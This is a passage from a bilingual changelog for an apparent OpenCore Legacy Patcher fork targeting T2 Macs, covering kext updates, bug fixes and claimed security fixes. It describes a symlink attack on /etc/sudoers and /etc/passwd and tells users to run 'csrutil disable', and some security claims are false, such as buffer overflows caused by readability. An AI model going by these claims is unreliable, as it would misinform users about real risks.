Die Sicherheitslücke: Ältere Methoden zur Pfadverknüpfung (String-Konkatenation mittels /) sind anfällig für „Dot-Dot-Slash“-Angriffe (../). Ein Angreifer könnte einen Dateipfad so konstruieren, dass er aus dem eigentlich vorgesehenen Binärverzeichnis ausbricht, um Systemdateien oder sensible Konfigurationen zu überschreiben.
Die Behebung: Vollständige Umstellung auf pathlib.Path. Die Logik der Methoden .resolve() sowie des Divisionsoperators (/) in pathlib handhabt die Pfadnormalisierung auf sicherere Weise. Dies stellt sicher, dass Dateivorgänge innerhalb der erwarteten Verzeichnisstruktur verbleiben, indem Pfade als Objekte und nicht lediglich als Zeichenketten behandelt werden.

Persistenz-Lecks (Zombies & Mount-Sperren)
Die Schwachstelle: Das ursprüngliche Skript verließ sich auf atexit, um DMGs wieder auszuhängen. Falls das Skript mittendrin abstürzte (z. B. aufgrund des Fehlers bei der T2-Modellvalidierung, den Sie zuvor gesehen haben), wurde atexit unter Umständen nie ausgelöst. Dies führt dazu, dass die Datei Universal-Binaries.dmg eingehängt bleibt und die Shadow-Datei gesperrt wird; dies kann den Start künftiger Builds verhindern oder zu einem Verlust an freiem Speicherplatz führen.
Die Lösung: Es wurde ein try...finally-Block auf der obersten Ebene der init-Methode implementiert. Der finally-Block stellt in Python einen „garantierten“ Ausführungspfad dar. Selbst wenn ein Validierungsfehler eine Exception auslöst und das Skript beendet, werden die Funktionen _cleanup_build_artifacts() und _unmount_dmg() unmittelbar ausgeführt, wodurch die Einhängepunkte und temporären Dateien bereinigt werden.

With this release, we're closer than ever to start offering betas too. Mit dieser Version wir sind näher als zuvor, Betas asuzurollen.

ist die erste, die sie läuft, ohne dass Sie OpenCore Legacy Patcher T2 von Source laden
Fügt OpenCore-Patcher-GUI.spec, um den App zu ermöglichen, zu bauen
Fehler: dies ist die erste Version, der ohne laufen von Source möglich ist. Aber, um OpenCore zu bauen, erwartet noch einen Terminalfenster und bricht ab.

## 4.0.0 alpha 9:
Thanks @GUTY345 for contributing to this project!
This release:

finalizes security patches done in gui_settings.py in alpha 5 as there were bugs where when disabling or changing some settings the app may crash

fixes a bug where when not choosing a specific SMBIOS via Settings, Build returned None, which could result in improper patches or Build OpenCore to be grayed out

added an SSDT for the 2018 MacBook Pro from #35; requires reverse engineering to become universal for all T2 Macs

Adds T2 patches, Intel UHD Graphics 630 patches, and fixes incorrect NVRAM variables

Adds 2 more buttons if building EFI fails with an error:

Fix the following vulnerabilities:

Hardware Detection "Poisoning" (Logic Fix)
In your original file, the smbios_probe method prioritized NVRAM variables like oem-product over the actual hardware data. If you had previously used OCLP to spoof your Mac as a different model, the app would get "stuck" seeing that spoofed ID even when running on your native MacBookPro16,2.
The Fix: I added a "Native Support Bypass." The code now checks if the reported_model is a known T2 Intel Mac (like the Macmini8,1 or MacBookPro16,2). If it matches, the app ignores the spoofed NVRAM variables and uses the real hardware ID. This ensures your 2020 MacBook is seen as "Supported" rather than "Unsupported."

Cryptographic Weakness (SHA-1 to SHA-256)
The original code used hashlib.sha1 to generate a unique hardware identifier from the IOPlatformUUID. SHA-1 is considered cryptographically "broken" because it is vulnerable to collision attacks, where two different inputs produce the same hash.
The Fix: I updated the hashing logic to use SHA-256. This provides a significantly higher level of security for hardware identification. It prevents a scenario where a malicious script could spoof a "trusted" hardware ID by matching a SHA-1 hash, which is technically possible on modern hardware.

Subprocess Execution Hardening
In the original script, several subprocess.run calls lacked explicit safety checks or proper handling of system paths. While not a direct "exploit" in a vacuum, it is a common vector for Command Injection if the script is ever modified to accept user-defined variables.
The Fix: The updated file standardizes the use of absolute paths (e.g., /usr/sbin/sysctl) and ensures that output is handled via stdout=subprocess.PIPE without using shell=True. This prevents the shell from interpreting special characters that might be injected via system properties.

T2 Security State Verification
The logic for checking Secure Boot and the T2 chip was simplified to ensure it doesn't accidentally report a "False Negative" if the chip is in a non-standard state (like "Medium Security").
The Fix: By ensuring the t1_probe and smbios_probe correctly identify the T2 interface even when AMFI (Apple Mobile File Integrity) is toggled, the app avoids crashing or reporting "Unsupported" simply because the security policy is currently lowered for development.

Shell Command InjectionVulnerability: The original code used subprocess.run with a single string and shell=True (or implicitly allowed shell interpretation) when calling /usr/bin/fdesetup status. This is a classic injection point where a malicious actor could potentially inject arbitrary commands if system variables were tampered with. The Fix: The code now uses list-based arguments: subprocess.run(["/usr/bin/fdesetup", "status"], ...) with shell=False. This ensures that the system treats "status" strictly as an argument and not as part of a command string, closing the injection window.

Logic-Based Denial of Service (DoS)Vulnerability: In the _handle_sip_breakdown method, the previous logic assumed the SIP_ENABLED key always existed in the requirements dictionary. If a specific hardware configuration caused that key to be missing, the application would crash during the dictionary index lookup.The Fix: Added a safe existence check (if HardwarePatchsetValidation.SIP_ENABLED in requirements:) before performing the index operation. This prevents the patcher from crashing on unexpected hardware profiles.

Insecure Hardware Mixing (Hardware Identification Bug)Vulnerability: The patcher previously could allow a "mixed" state where both Metal and Non-Metal patches were queued for the same system. On macOS Sequoia and Tahoe, this can lead to kernel panics or a "black screen" boot loop because the system cannot handle conflicting graphics acceleration kexts. The Fix: Strengthened the _strip_incompatible_hardware logic. It now strictly enforces a hierarchy: if any Metal GPU is detected, all Non-Metal hardware is purged from the patch list. It also specifically prevents Metal 3802 and Metal 31001 graphics from being mixed on Sequoia or newer, which is a known cause of system instability.

Native Host Bypass (The "Tahoe Logic" Bug)Logic Fix: For users on newer Intel Macs (like the 2020 MacBook Pro 16,2 or Mac mini 8,1), the original code might still attempt to apply legacy patches when running macOS Tahoe. This refactor includes a specific check for these models to identify them as "Native" and immediately disable patching, preventing the installation of unnecessary kexts that could break native security features like the T2 chip's integrity checks.

Data Integrity & Consistency
The "Empty Patch" Safety: In the original code, can_patch was sometimes set to True even if no actual patches were found for the system. This could lead to the UI showing a "Start Patching" button that does nothing. The refactor adds a check: self.can_patch = (not _cant_patch) and (len(patches) > 0). Now, if your hardware is already supported natively, the patcher won't offer to "fix" it.
Dictionary Initialization: The device_properties and patches attributes are now explicitly initialized as empty dictionaries ({}) in the constructor. This prevents "AttributeError" crashes if _detect() fails or exits early due to an error.

Refined Hardware Filtering
Sequoia/Tahoe Specificity: The logic for stripping incompatible hardware was updated to be "OS-aware." For example, it now specifically checks self._xnu_major >= os_data.sequoia.value before stripping certain Metal 3802 graphics drivers. This ensures that users on older versions of macOS (like Big Sur) don't lose driver support that was perfectly stable on those older systems.
AMFI Level Escalation: The original code could sometimes fluctuate on which AMFI (Apple Mobile File Integrity) level to require. The refactor uses a "highest wins" logic (if item.required_amfi_level() > highest_amfi_level), ensuring that if one hardware component needs a high security bypass, the entire system is configured to support it, preventing partial boots where the GPU works but the WiFi doesn't.

Error Handling & Performance
Recursive SIP Decoding Fix: The _handle_sip_breakdown function was rewritten to be more efficient. Instead of repeatedly looping through SIP configurations, it performs a single lookup to generate the "Expected vs Booted" status string. This makes the UI feedback significantly faster on older CPUs like the Core 2 Duo.
Path Resolution: Used Path("~/.dortania_developer").expanduser().exists() instead of raw string manipulation. This is more cross-platform (helpful for developers testing on Windows/Linux) and handles edge cases where the home directory might be on a non-standard mount point.

## 4.0.0 alpha 8
This release:

Fixes a bug where when the EFI is ready, the popup crashes

Diese Version:

Behebt einen Fehler, der zum Absturz des Popups führte, sobald die EFI bereit war.

## 4.0.0 alpha 7:
This release:
- Fixes a bug where when the EFI is ready, the popup crashes
- The Ask Gemini button overlapped

Diese Version:

- Behebt einen Fehler, der zum Absturz des Popups führte, sobald die EFI bereit war.

- Behebt einen Fehler, der dazu führte, dass die Schaltfläche „Gemini fragen“ überlappte.

## 4.0.0 alpha 6:
This release:
- Adds Ask Gemini button
- Increases the MainFrame window size
- On MacBookAir8,1 and MacBookAir8,2, previously, if you install macOS 15 Sequoia, WEG would be disabled. But that's an issue, because the Intel UHD Graphics 617 is not supported by macOS 15 Sequoia, not to mention macOS 26 Tahoe. No other MacBook, iMac or Mac Pro uses Intel UHD Graphics 617. It may require GPU spoofing.
- Fix where when trying to disable USB-Map.kext or USB-Map-Tahoe.kext on Macs affected by Unsupported Mantissa speed panics, it was looking for a kext that actually in most cases doesn't exist and skips disabling USB port mapping
- Adds several other T2 patches 
- Fix a bug where one NVRAM variable could be added twice and fix several vulnerabilities:
1. Prevention of "String Bloat" (Idempotency)
In your original code, every time the script ran, it would do this:
self.config["..."]["boot-args"] += " -v"
If you ran the builder five times, your config would end up with -v -v -v -v -v.

The Fix: The new _update_nvram_string method checks if value not in current_value. It only adds the argument if it’s missing, keeping the NVRAM clean and preventing the boot-args string from exceeding its character limit.

2. Elimination of KeyError Crashes
The original code assumed that the dictionary keys for NVRAM and Apple's UUID always existed. If a user had a stripped-down or non-standard config.plist, the script would crash with a KeyError.

The Fix: I added logic to check if the UUID and Key exist:

Python
if uuid not in self.config["NVRAM"]["Add"]:
    self.config["NVRAM"]["Add"][uuid] = {}
This ensures the script creates the necessary "folders" in the data structure instead of crashing because they aren't there.

3. Proper Spacing Logic
The original code simply added a space at the start of the string (+= " -v"). If the boot-args key was empty, you’d end up with " -v" (a leading space), which can sometimes cause parsing issues in bootloaders.

The Fix: The helper method uses .strip() and .rstrip() to ensure that arguments are separated by exactly one space, with no leading or trailing whitespace.

4. Overwrite Protection
For sensitive values like csr-active-config (SIP), the original code would blindly overwrite whatever was there.

The Fix: The _set_nvram_value method allows for an overwrite=False flag. While I kept it as True for SIP (since the patcher must control that value), the structure is now there to prevent accidental overwrites of other variables.

5. Code Readability and Maintenance
By moving the NVRAM logic into helper functions, the "Business Logic" of the _build method is much easier to read. This reduces the "Human Error" vulnerability where a developer might copy-paste a line but forget to change the UUID or the key name.

These all 5 conditions create Buffer Overflow vulnerabilities in the NVRAM.   

Diese Version:

- Fügt die Schaltfläche „Gemini fragen“ hinzu

- Vergrößert das MainFrame-Fenster

- Auf MacBookAir8,1 und MacBookAir8,2 wurde WEG bei der Installation von macOS 15 Sequoia deaktiviert. Dies ist jedoch problematisch, da die Intel UHD Graphics 617 weder von macOS 15 Sequoia noch von macOS 26 Tahoe unterstützt wird. Kein anderes MacBook, iMac oder Mac Pro verwendet die Intel UHD Graphics 617. Unter Umständen ist GPU-Spoofing erforderlich.

- Behebt einen Fehler, bei dem beim Deaktivieren von USB-Map.kext oder USB-Map-Tahoe.kext auf Macs, die von Geschwindigkeitsabstürzen aufgrund nicht unterstützter Mantissa-Dateien betroffen sind, nach einer Kext-Datei gesucht wurde, die in den meisten Fällen nicht existierte, und die Deaktivierung der USB-Portzuordnung übersprungen wurde.

- Fügt mehrere weitere T2-Patches hinzu.

- Behebt einen Fehler, durch den eine NVRAM-Variable doppelt hinzugefügt werden konnte, und behebt mehrere Sicherheitslücken:
1. Verhinderung von String-Aufblähung (Idempotenz):
Im ursprünglichen Code führte das Skript bei jeder Ausführung Folgendes aus:
self.config["..."]["boot-args"] += " -v"
Wenn der Builder fünfmal ausgeführt wurde, enthielt die Konfiguration am Ende die Werte -v -v -v -v -v.

Die Lösung: Die neue Methode _update_nvram_string prüft, ob der Wert nicht in current_value enthalten ist. Sie fügt das Argument nur hinzu, wenn es fehlt. Dadurch bleibt der NVRAM sauber und die Zeichenbegrenzung der Boot-Argumente wird nicht überschritten.

2. Beseitigung von KeyError-Abstürzen
Der ursprüngliche Code ging davon aus, dass die Wörterbuchschlüssel für NVRAM und Apples UUID immer vorhanden sind. Bei einer reduzierten oder nicht standardmäßigen config.plist führte dies zu einem KeyError-Absturz.

Die Lösung: Ich habe eine Logik hinzugefügt, die prüft, ob UUID und Schlüssel vorhanden sind:

Python:
if uuid not in self.config["NVRAM"]["Add"]:

self.config["NVRAM"]["Add"][uuid] = {}
Dadurch wird sichergestellt, dass das Skript die benötigten Ordner in der Datenstruktur erstellt, anstatt abzustürzen, weil sie fehlen.

3. Korrekte Leerzeichenlogik
Der ursprüngliche Code fügte einfach ein Leerzeichen am Anfang der Zeichenkette hinzu (+= " -v"). Wenn der Schlüssel "boot-args" leer war, führte dies zu einem führenden Leerzeichen " -v", was manchmal zu Parsing-Problemen in Bootloadern führen kann.

Die Lösung: Die Hilfsmethode verwendet `.strip()` und `.rstrip()`, um sicherzustellen, dass Argumente durch genau ein Leerzeichen getrennt sind und keine führenden oder nachfolgenden Leerzeichen enthalten.

4. Schutz vor Überschreiben
Bei sensiblen Werten wie `csr-active-config` (SIP) überschrieb der ursprüngliche Code die vorhandenen Werte.

Die Lösung: Die Methode `_set_nvram_value` ermöglicht die Option `overwrite=False`. Obwohl ich sie für SIP auf `True` gesetzt habe (da der Patcher diesen Wert kontrollieren muss), verhindert die Struktur nun versehentliches Überschreiben anderer Variablen.

5. Lesbarkeit und Wartbarkeit des Codes
Durch die Auslagerung der NVRAM-Logik in Hilfsfunktionen ist die Geschäftslogik der Methode `_build` deutlich lesbarer. Dies reduziert die Anfälligkeit für menschliche Fehler, die entstehen können, wenn ein Entwickler eine Zeile kopiert und einfügt, aber vergisst, die UUID oder den Schlüsselnamen zu ändern.
All die 5 erstellen Bedingungen für Buffer Overflow-Sicherheitslücken.

## 4.0.0 alpha 5 - the emergency update / der Notfallsupdate 🚨 :
This release:
- Fixes a bug where settings couldn't be saved 
- and the following vulnerabilities:
1. Arbitrary File Overwrite (via Symlink Attack)
The Vulnerability: An attacker could replace your settings file with a symbolic link (symlink) pointing to a critical system file (e.g., /etc/sudoers or /etc/passwd). When the script tried to save settings, it would follow that link and overwrite the system file with its own data, potentially breaking the OS or creating a back door.

The Fix: By adding if Path(...).is_symlink(): Path(...).unlink(), the script now detects if the file is a "shortcut" to somewhere else. If it is, the script destroys the link and creates a brand-new, real file instead, ensuring it never touches a file it didn't intend to.

2. Privilege Escalation
The Vulnerability: Because the script uses /Users/Shared, a location accessible to all users on a Mac, a standard (non-admin) user could "plant" a settings file. When an Admin runs the Patcher, the tool would read the standard user's "poisoned" settings (like a custom script path or a dangerous boot flag) and execute them with Admin or Root privileges.

The Fix: The updated logic (especially when combined with checking os.stat().st_uid) ensures the script only trusts files owned by the current user or root. By unlinking existing files that don't pass the check, you prevent a low-privileged user from influencing a high-privileged process.

3. Information Disclosure
The Vulnerability: Without explicit permission management, the settings file might be created with "world-readable" permissions. This could allow any user or malicious app on the system to read your configuration, including hardware serial numbers, board IDs, and other sensitive system identifiers used by OpenCore.

The Fix: By adding os.chmod(..., 0o600), you ensure that only the owner of the file (you or the system) can read or write it. This "locks the door," making the file invisible and inaccessible to other users or third-party apps on the machine.

Diese Version:

- Behebt einen Fehler, der das Speichern von Einstellungen verhinderte

- und die folgenden Sicherheitslücken:
1. Beliebiges Überschreiben von Dateien (über Symlink-Angriff)
Die Sicherheitslücke: Ein Angreifer konnte Ihre Einstellungsdatei durch einen symbolischen Link (Symlink) ersetzen, der auf eine kritische Systemdatei (z. B. /etc/sudoers oder /etc/passwd) verweist. Beim Versuch, die Einstellungen zu speichern, folgte das Skript diesem Link und überschrieb die Systemdatei mit eigenen Daten. Dies kann das Betriebssystem beschädigen oder eine Hintertür öffnen.

Die Lösung: Durch Hinzufügen von `if Path(...).is_symlink(): Path(...).unlink()` erkennt das Skript nun, ob es sich bei der Datei um eine Verknüpfung zu einem anderen Verzeichnis handelt. In diesem Fall zerstört das Skript den Link und erstellt stattdessen eine neue, echte Datei. So wird sichergestellt, dass niemals eine Datei verändert wird, die nicht beabsichtigt war.

2. Rechteausweitung
Die Schwachstelle: Da das Skript den Ordner /Users/Shared verwendet, auf den alle Benutzer eines Macs Zugriff haben, könnte ein normaler Benutzer (ohne Administratorrechte) eine Einstellungsdatei dort platzieren. Wenn ein Administrator den Patcher ausführt, liest das Tool die manipulierten Einstellungen des normalen Benutzers (z. B. einen benutzerdefinierten Skriptpfad oder ein gefährliches Boot-Flag) und führt sie mit Administrator- oder Root-Rechten aus.

Die Lösung: Die aktualisierte Logik (insbesondere in Kombination mit der Überprüfung von os.stat().st_uid) stellt sicher, dass das Skript nur Dateien vertraut, die dem aktuellen Benutzer oder Root gehören. Durch das Entfernen vorhandener Dateien, die die Überprüfung nicht bestehen, wird verhindert, dass ein Benutzer mit geringen Rechten einen Prozess mit hohen Rechten beeinflusst.

3. Offenlegung von Informationen
Die Schwachstelle: Ohne explizite Berechtigungsverwaltung kann die Einstellungsdatei mit für alle Benutzer lesbaren Berechtigungen erstellt werden. Dies könnte es jedem Benutzer oder jeder bösartigen Anwendung auf dem System ermöglichen, Ihre Konfiguration zu lesen, einschließlich Hardware-Seriennummern, Board-IDs und anderer sensibler Systemkennungen, die von OpenCore verwendet werden.

Die Lösung: Durch Hinzufügen von `os.chmod(..., 0o600)` stellen Sie sicher, dass nur der Eigentümer der Datei (Sie oder das System) diese lesen und schreiben kann. Dadurch wird die Datei quasi „abgesperrt“ und ist für andere Benutzer oder Drittanbieter-Apps auf dem System unsichtbar und unzugänglich.

## 4.0.0 alpha 4:
Thanks @kodeaqua for contributing to this project for the research of MacBook Air 2018 and 2019! This helps us identify the issues it faces to boot into macOS Recovery that other people are facing. I myself only have Mac mini 2018 and MacBook Pro 2020 4 thunderbolt 3 ports and they work completely differently from these 2 MacBook Airs.
This version:
- fixes overall identation issues and other bugs
- fixes a bug where MacBookAir9,1 that OpenCore Legacy Patcher T2 thought it wasn't a T2 Mac - to be more precise, it wasn't included in the T2_CHIP function - instead, when it saw MacBookAir9,1, it exited this function and continued to issue generic kexts and patches, and skipped patches for T2 Macs
- Fixed Unsupported Mantissa speed bugs on MacBookAir8,1 through 9,1 and MacBookPro16,3 - as a workaround, the Select a language and region screen will be skipped and macOS Recovery on these models will be always English - United States.

Dieser Version:
Danke @kodeaqua, dass Sie zu diesem Projekt beigetragt haben über die Recherche für MacBook Air 2018 und MacBook Air 2019! Dies hilft uns, den Fehler, indem diese MacBooks nicht richtig in macOS-Wiederherstellung starten zu beheben, die andere Personen gemeldet haben. Ich habe nur MacBook Pro 2020 4 thunderbolt 3 ports und Mac mini 2018, und diese Modelle funktionieren anders als diesen MacBook Air-Modellen.
- behebt unnötigen Leerplatzen und andere Fehler
- Behebt einen Fehler, indem OpenCore Legacy Patcher T2 denkt als MacBookAir9,1 kein T2-Mac wäre - ich meine damit, dass der MacBookAir9,1 nicht in die T2_CHIP-Funktion erhaltete - stattdessen, wenn er weißt um welches Mac handelte (MacBookAir9,1), der App dann verlasste die T2_CHIP-Funktion und fährte weiter mit Standard-Kexts und Patches und überspringte Patches für T2 Macs
- Behebt den Fehler, indem beim Anklicken von -> in Sprache auswählen, der T2-Kontroller abstürzte mit dem Fehler Unsupported Mantissa speed - als einen Umweg, der Sprache auswählen-Schritt wird übersprungen und der Sprache ins macOS-Wiederherstellung aufs MacBookAir8,1 bis MacBookAir9,1 und MacBookPro16,3 wird Englisch (USA) sein.

- Download macOS installer icon is changed to macOS 26 Tahoe from an old macOS beta icon

Dieses Version:
- Behebt einen Fehler, indem AMFIPass.kext auf T2 Macs nicht injiziert wurde
- Behebt einen Fehler, indem WhateverGreen.kext zweimals injiziert wurde
- Unterstützung von MacBook Air 2018 und MacBook Air 2019 ist wiederhergestellt - jetzt ist sicherer, diese MacBooks aufs nicht unterstützten macOS-Version-Installationsprogramm zu booten als in Version wie OpenCore Legacy Patcher T2 3.1.0 Alpha 3, wo OpenCore 1.0.5 noch verwendet wurde. 
- Den Icon fürs Download macOS installer (macOS-Installationsprogramme herunterladen) ist aufs macOS 26 Tahoe von einen alten macOS beta gewechselt.

This release:

Removes USB port mapping for MacBookAir8,1 and 8,2 - this can eventually cause hangs
Fix #23
## 3.1.1 pre-alpha 3:
## Security & Privacy Improvements
Deprecated Third-Party KDK Endpoints: Completely removed dependency on third-party proxies (OMAPIv1 / OMAPIv2) for Kernel Debug Kit retrieval.

Eliminated Telemetry Tracking: Stopped sending client IP addresses, request intervals, and OS build metadata to external non-Dortania endpoints.

Mitigated Supply Chain & MitM Risks: Enforced direct and secure connections to the official Dortania GitHub repository (KDK_API_LINK_ORIGIN) to prevent Man-in-the-Middle (MitM) attacks caused by unencrypted HTTP fallbacks.

Enhanced Local Integrity Validation: Tightened the validation process for existing KDK installations, reducing reliance on legacy insecure verification scripts.

## Why These Changes Matter
For users and developers, transitioning from the third-party implementation back to Dortania’s original infrastructure provides significant improvements:

Data Privacy: Your system's IP address, patcher version, and build configuration are no longer logged by intermediate SimpleHac servers.

Supply Chain Security: Downloads are retrieved solely via Dortania's official release mirrors, ensuring the authenticity of the binaries.
## Other changes include:
- Changed DisableIoMapper from False to True for T2 Macs
- Update RestrictEvents to 1.1.6
- Update CryptexFixup to 1.0.5
- Update FeatureUnlock to 1.1.8 

## Emergency update for alpha users only: 3.1.0 alpha 3.0:
This is an emergency update.

Eliminated Telemetry Tracking: Stopped sending client IP addresses, request intervals, and OS build metadata to external non-Dortania endpoints.

Mitigated Supply Chain & MitM Risks: Enforced direct and secure connections to the official Dortania GitHub repository (KDK_API_LINK_ORIGIN) to prevent Man-in-the-Middle (MitM) attacks caused by unencrypted HTTP fallbacks.

Enhanced Local Integrity Validation: Tightened the validation process for existing KDK installations, reducing reliance on legacy insecure verification scripts.

## Why These Changes Matter
For users and developers, transitioning from the third-party implementation back to Dortania’s original infrastructure provides significant improvements:

Data Privacy: Your system's IP address, patcher version, and build configuration are no longer logged by intermediate SimpleHac servers.

Supply Chain Security: Downloads are retrieved solely via Dortania's official release mirrors, ensuring the authenticity of the binaries.


## 3.1.1 pre-alpha 3:
This release:
- Removes USB port mapping for MacBookAir8,1 and 8,2 - this can eventually cause hangs
- Fix https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/issues/23

## 3.1.1 pre-alpha 2.1:
This release fixes a config.plist bug that doesn't build OpenCore properly on non-T2 Macs. On T2 Macs, this issue remains: https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/issues/23

## 3.1.1 pre-alpha 2:
- upgrades config.plist to OpenCore 1.0.7
- Upgrades WhateverGreen to 1.7.0
- Upgrades Lilu to 1.72
- Fix a vulnerability that lets attackers skip injecting necessary T2 kexts to launch a DoS attack - this vulnerability affects this repository only)
- Fix a vulnerability that lets attackers claim the EFI is built when the EFI is broken to launch a DoS attack on any Mac - this vulnerability affects this repository only
To fix these vulnerabilities, if you are running 3.1.1 pre-alpha 1, update immediately to the latest pre-alpha release. If you are using the alpha version instead, you should wait until a later alpha version is released since this vulnerability is not patched yet.

## 3.1.1 pre-alpha 1:
This version begins the upgrade from OpenCore 1.0.5 to 1.0.7 (but hasn't fully upgraded yet). Still it uses mostly 1.0.5.

## 3.1.0 alpha 2.1:
This release:
- blacks out Build OpenCore on 2018-2019 MacBook Airs since these models frequently freeze at the Apple logo. This project still uses OpenCore 1.0.5, upgrading to OpenCore 1.0.7 is planned to eventually begin to fix the following issues: https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/issues/18 and https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/issues/8 and eventually, get the MacBookAir8,1 and 8,2 to boot reliably into macOS's installer. Outside this release, in the branch https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/tree/opencore-1-0-7-upgrade I started upgrading to OpenCore 1.0.7, but the code is considered at a pre-alpha stage and is still in very very early development. To test building OpenCore EFI on these models (if you are ready to experiment), you will need to go to the model_array file and remove # from the model that you are going to be testing. 
- phases out iBridged.kext completely- not needed
- removes SSDT-T2-SPOOF.dsl as it only spoofed the iBridged version that the T2 chip is running and this is not needed; replaced with [SSDT-T2-SPOOF-SSDT.txt](https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/blob/main/SSDT-T2-SPOOF-SSDT.txt), [T2-Lilu-hooks.txt](https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/blob/main/T2-Lilu-hooks.txt) and [T2-costum-kext-concept.txt](https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/blob/main/T2-costum-kext-concept.txt) - they aren't precompiled and ready to use, rather than there to do research.
- Remove temporarily Info-Tahoe.plist from AppleUSBMaps (this doesn't affect the OpenCore 1.0.7 upgrade branch), as this is not a full USB port map and as such is incomplete and not even close to ready for testing (this is included in the official OpenCore Legacy Patcher 3.0.0).

The issues https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/issues/8 and https://github.com/albert-mueller/OpenCore-Legacy-Patcher-T2/issues/18 aren't fixed yet. Both of these require to upgrade OpenCore to version 1.0.7 at very minimum for sure.

Reminder: before to boot into OpenCore on T2 Macs, don't forget to hold command + R until macOS Recovery loads. Then go to Utilities > Terminal. Then, type the following commands:
csrutil disable
csrutil-authenticated root disable
And then go to Apple Logo > Restart. Then you can boot into OpenCore and boot into macOS's installer.

## 3.1.0 alpha 2:
This release:
- fixes duplicate NVRAM arguments for T2 Macs, which in some cases can cause T2 Macs to stall at the Apple logo or attackers to abuse this via Buffer Overflow vulnerabilities
- Switching back to Dortania's own PatcherSupportPkg, this time using the latest version that is available
- On MacBook Air 2018 and 2019, if you download the macOS 15 Sequoia via the OpenCore Legacy Patcher T2 app, now it will disable WhateverGreen. However, if you use an existing installer or just build OpenCore using macOS 14 Sonoma, then it will still enable WhateverGreen.
- Fix Function Error: 'NoneType' object does not support item assignment
- Exclude MacBookPro15,4 from the Board ID exemption patches
- Fix a bug where a missing comma prevented Mac mini 2018 and MacBook Pro 2020 2 thunderbolt 3 ports from getting excluded from the Boot Logo patches
- exclude the iMac Pro from Boot Logo patches
- Fix a vulnerability where when patching T1 Macs, attackers can launch State of Confusion attacks, Denial of Service attacks or malformed imputs - this vulnerability affects all versions of this repository until 3.1.0 alpha 1 and also affects the official OpenCore Legacy Patcher by Dortania repo too
## 3.1.0 alpha 1:
This release removes iBridged.kext in favor of SSDT patching that automated patch via the OpenCore Legacy Patcher app is not written yet - so you need after building the EFI to add the file via OCAT. And from this release onwards, PatcherSupportPkg files will be downloaded from OCLP-Mod's fork rather than directly from Dortania as they have better macOS 26 support. If you come across a bug where something doesn't download properly, make sure to report this issue and eventually suggest a fix as this project has just started transitioning from Dortania's PatcherSupportPkg to the one used by OCLP-Mod.

## 3.0.0 alpha 15:
This release adds the following fixes:
- fixes port mapping logic bugs and connector bugs for the USB ports on MacBook6,1 and 6,2
- Partial iBridged patching logic (not fully done yet, so it may not add iBridged into the kexts automatically yet)

Adding the following from https://github.com/vytska69/OpenCore-Legacy-Patcher that are made by vytska69 into this repository:
- Added .github/workflows (imported from the repository above)
- Adding the following patches:
- Add AMFI patches and set boot-args to -v rddelay=5 amfi_get_out_of_my_way=0x1 igfxfw=2 igfxonln=1
-  Add MacBookAir8,1 and MacBookAir8,2 USB patches
- Add AppleSEPManager patches
- Disable Board ID exemption patches
- Disabling Boot Logo patches to prevent kernel panics and boot loops from occuring
- Enable WhateverGreen on unsupported T2 Macs if necessary
- fix: make gktool scan non-fatal in PKG postinstall script

The only thing that remains to be tested is whether T2 Macs can now properly boot into macOS 15 and 26's installers and finish the implementation of the patches for iBridged.kext.
## 3.0.0 alpha 14:
This release adds a stable version of WhateverGreen.kext directly from Dortania. But how good it works with iBridged remains to be tested.

## 3.0.0 alpha 13:
This version removes the broken WhateverGreen.kext from the code. When there is a new fully functional file, I'll add it again.

## 3.0.0 alpha 12:
This release fixes the following issues:
GUI and Backend Improvements
Fix Build & Install Frame Stability:

Implemented finally blocks in gui_build.py and gui_install_oc.py to ensure logging handlers are properly detached.

This resolves the RuntimeError: C/C++ object has been deleted when transitioning between build and installation screens.

Refactor Thread Management:

Replaced index-based handler removal (handlers[2]) with explicit object references.

Fixes IndexError: list index out of range occurring on faster machines or when disk unmounting is delayed.

Improve Installation Reliability:

Restored missing backend calls in the installation thread to ensure OpenCore is actually written to the EFI partition.

Fixed a logic bug where self.result wasn't being updated, which previously prevented the "Success" and "Reboot" prompts from appearing.

Python 3.13/3.14 Compatibility:

General code cleanup to support stricter object lifecycle management in newer Python environments.

## 3.0.0 alpha 11:
This release:
- Resolved RuntimeError: wrapped C/C++ object of type TextCtrl has been deleted in the Build Frame. This was achieved by implementing a finally block to ensure the ThreadHandler is explicitly removed from the global logger before the UI frame is destroyed, preventing race conditions during build-to-install transitions.

## 3.0.0 alpha 10 and 10S:
3.0.0 alpha 10 alongside 3.0.0 alpha 10S fixes the following issues:
- In updates.py, REPO_LATEST_RELEASE_URL was pointing to a web page. This bug affects all versions from 3.0.0 alpha 2 onwards.
- Fixes a bug in gui_build.py that prevents OpenCore EFIs from building.

Known issue:
- core.py panics as soon as trying to apply OpenCore EFIs and thus the app crashes

## 3.0.0 alpha 9
This release:
- Adds the special version of WhateverGreen that works with iBridged - but will not be injected automatically via OCLP until a future alpha release, just like the iBridged.kext. To inject these, first build the EFI via the OpenCore Legacy Patcher app as you would do noramlly, and then add those 2 kexts via OCAuxiliaryTools or ProperTree.
- Fixes a bug in logging_handler.py that makes the application less stable or outright to crash
- Now, when the OpenCore Legacy Patcher app crashes, it will show the error just like pre-alpha 5, so for example attackers can't unknowingly exploit vulnerabilities, for example - to crash the app and unknowingly to the user they execute malicious code. This bug affects this repository only. It's both a bug and a vulnerability.

To fix this vulnerability, update to the latest version available.

## 3.0.0 alpha 8:
This release will start enabling WhateverGreen.kext for unsupported T2 Macs to allow patching GPUs in the future - but only partially. And this release also fixes a vulnerability where when trying to build OpenCore EFI on unsupported T2 Macs, an attacker can prevent from building the EFI and execute arbitary code in the background unknowingly while to the user it shows an error only. This vulnerability affects this project only. This vulnerability was present since 3.0.0 alpha 1.

To fix this vulnerability, update to the latest version available.

## 3.0.0 alpha 7
This release adds:
